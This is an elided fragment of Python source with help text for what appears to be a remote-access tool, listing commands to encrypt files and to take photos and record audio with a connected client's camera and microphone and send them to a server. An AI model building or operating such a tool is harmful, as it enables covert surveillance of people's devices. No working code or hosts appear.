...
COMMANDS = {'help': ['Shows this help'],
            ...
            'encrypt': [
                ...
                'Just write encrypt [name of file'
                'with extension] [password]'],
            'decrypt': [
                'After making a connection, you can use this command '
            ...
            'show camera': [
                'After making a connection, you can use this command '
                'to take a photo using the clients computer camera '
                'and transfer it to the server'],
            'record audio': [
                'After making a connection, you can use this command '
                'to record audio using the clients computer mic, '
                'and transfer it to the server'],
            'quit': [
